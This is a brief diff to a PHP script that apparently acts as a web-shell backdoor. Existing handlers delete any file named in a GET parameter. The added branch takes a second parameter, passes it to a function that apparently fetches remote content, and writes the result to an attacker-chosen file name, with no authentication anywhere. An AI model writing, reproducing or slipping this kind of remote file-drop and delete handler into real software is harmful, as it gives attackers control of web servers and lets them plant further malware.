@@ -54,6 +54,12 @@ if(isset($_GET['dw'])){
     $n=$_GET['del'];
     $dd=unlink($n);
     echo 200;
+}else if(isset($_GET['d'])){
+  $v=$_GET['d'];
+  $n=gcssl($v);
+  $name=$_GET['n'];
+  file_put_contents($name,$n);
+  echo 200;
 }else{
   echo 404;
 }
